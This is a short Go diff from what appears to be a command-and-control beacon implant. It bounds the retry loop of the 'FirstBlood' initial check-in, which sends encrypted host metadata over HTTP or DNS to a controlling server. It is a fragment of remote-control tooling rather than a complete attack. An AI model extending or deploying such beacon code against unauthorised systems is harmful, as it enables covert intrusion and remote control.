@@ -328,7 +328,7 @@ func MakeMetaInfo4plus() []byte {
 
 func FirstBlood() bool {
 	encryptedMetaInfo = EncryptedMetaInfo()
-	for {
+	for i := 0; i < config.MaxRetries; i++ {
 		var err error
 		if !config.IsDNS {
 			_, err = HttpGet(encryptedMetaInfo)
@@ -341,9 +341,9 @@ func FirstBlood() bool {
 			continue
 		}
 		util.Println("firstblood: ok")
-		break
+		return true
 	}
-	return true
+	return false
 }
 
 func PullCommand() ([]byte, error) {
